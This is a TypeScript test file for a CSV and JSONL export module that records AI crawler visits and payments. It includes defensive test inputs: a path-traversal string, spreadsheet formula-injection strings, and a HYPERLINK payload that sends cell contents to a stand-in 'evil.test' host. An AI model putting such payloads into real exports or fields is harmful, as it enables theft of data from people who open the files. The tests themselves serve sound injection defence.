import assert from "node:assert/strict";
import { test } from "node:test";
import { usdc, type AttributedEvent, type ObservationEvent } from "@naulon/shared";
import { csvField } from "@naulon/shared";
import {
  exportFilename,
  parseFormat,
  parseKind,
  serializeEvents,
  serializeObservations,
  toJsonl,
} from "./export.ts";

const NOW = 1_800_000_000_000;

test("kind and format fall back to the safe default rather than erroring", () => {
  assert.equal(parseKind("events"), "events");
  assert.equal(parseKind("observations"), "observations");
  assert.equal(parseKind("../../etc/passwd"), "observations");
  assert.equal(parseKind(undefined), "observations");
  assert.equal(parseFormat("jsonl"), "jsonl");
  assert.equal(parseFormat("xlsx"), "csv");
});

test("csvField quotes commas, quotes and newlines", () => {
  assert.equal(csvField("plain"), "plain");
  assert.equal(csvField("a,b"), '"a,b"');
  assert.equal(csvField('say "hi"'), '"say ""hi"""');
  assert.equal(csvField("line\nbreak"), '"line\nbreak"');
});

test("a formula-leading field is defused — a User-Agent must not execute in a spreadsheet", () => {
  // The threat: `agentUa` and `slug` come off the wire. A spreadsheet evaluates a cell
  // beginning =, +, -, @, tab or CR as a formula, so a crawler could put executable
  // content into an operator's export just by sending it as its User-Agent.
  for (const payload of ["=1+1", "+1", "-1", "@SUM(A1)", "\t=cmd", "\r=cmd"]) {
    const out = csvField(payload);
    assert.ok(out.startsWith("'") || out.startsWith(`"'`), `${JSON.stringify(payload)} was not defused: ${out}`);
  }
  // The classic exfiltration payload, which also contains a comma, must be BOTH
  // apostrophe-prefixed and quoted.
  const nasty = csvField('=HYPERLINK("http://evil.test?x="&A1,"click")');
  assert.ok(nasty.startsWith(`"'=HYPERLINK`), nasty);
});

test("a NUMBER is exempt from the defusal — a leading minus is a sign, not an injection", () => {
  // The two branches that matter. Prefixing a negative number would turn the money column
  // into text and break arithmetic on the export; not prefixing a negative STRING would
  // leave the hole open. Shared's csvField is typed `string | number` precisely so the
  // caller has to decide which one it is holding.
  assert.equal(csvField(-0.01), "-0.01");
  assert.equal(csvField("-0.01"), `"'-0.01"`);
});

test("toJsonl emits one object per line and nothing at all for no rows", () => {
  assert.equal(toJsonl([{ a: 1 }, { a: 2 }]), '{"a":1}\n{"a":2}\n');
  assert.equal(toJsonl([]), "");
});

const OBS: ObservationEvent = {
  id: "obs-1",
  host: "example.test",
  slug: "on-stillness",
  verdict: "paid",
  classifiedAs: "agent",
  classifyReason: "wba-verified",
  kind: "citation",
  agentUa: "GPTBot/1.0",
  verified: true,
  verifiedAgent: "chatgpt.com",
  price: usdc(0.000075),
  at: NOW,
};

test("an observation export carries the identity and the full-precision price", () => {
  const csv = serializeObservations([OBS], "csv");
  const [head, row] = csv.trim().split("\n");
  assert.match(head!, /^at,verdict,classifiedAs,classifyReason,host,slug,kind,priceUsdc,identity/);
  assert.match(row!, /2027-01-15T/, "at is ISO, so a spreadsheet sorts it");
  assert.ok(row!.includes("0.000075"), "sub-cent tolls must survive — two decimals would read as zero");
  assert.ok(row!.includes("verified"), row!);
  assert.ok(row!.includes("chatgpt.com"), row!);
});

test("a masquerade exports as masquerade, not as unsigned", () => {
  const csv = serializeObservations([{ ...OBS, verified: false, sigInvalid: true }], "csv");
  assert.ok(csv.includes("masquerade"), csv);
});

test("an observation with no price exports an empty cell, never a zero", () => {
  const csv = serializeObservations([{ ...OBS, price: undefined, verdict: "served-free" }], "csv");
  const cells = csv.trim().split("\n")[1]!.split(",");
  assert.equal(cells[7], "", "an absent price is not the same claim as a free read priced at 0");
});

test("jsonl export is the raw record, so nothing is lost to a column list", () => {
  const out = serializeObservations([OBS], "jsonl").trim();
  assert.deepEqual(JSON.parse(out), OBS);
});

const EVENT = {
  id: "evt-1",
  slug: "on-stillness",
  kind: "read",
  amount: usdc(0.01),
  payees: [
    { authorId: "a", wallet: "0xaaaa", share: 0.7 },
    { authorId: "b", wallet: "0xbbbb", share: 0.3 },
  ],
  payerAddress: "0xcccc",
  settlementRef: "batch-9",
  chainId: 421614,
  at: NOW,
} as unknown as AttributedEvent;

test("a split payment exports every payee, as resolved amounts not raw shares", () => {
  // `AuthorShare.share` is a fraction. A cell reading `0xaaaa:0.7` next to a $0.01 event
  // invites exactly one misreading, so the column carries the resolved cut instead —
  // and showing only the first author would be worse than showing none.
  const csv = serializeEvents([EVENT], "csv");
  const row = csv.trim().split("\n")[1]!;
  assert.ok(row.includes("0xaaaa:0.007000"), row);
  assert.ok(row.includes("0xbbbb:0.003000"), row);
});

test("the filename sorts, names its contents, and carries no colons or spaces", () => {
  const name = exportFilename("observations", "csv", NOW);
  assert.match(name, /^naulon-observations-\d{4}-\d{2}-\d{2}T[\d-]+\.csv$/);
  assert.ok(!name.includes(":"), "colons break the filename on Windows");
  assert.ok(!name.includes(" "));
  assert.match(exportFilename("events", "jsonl", NOW), /^naulon-events-.*\.jsonl$/);
});
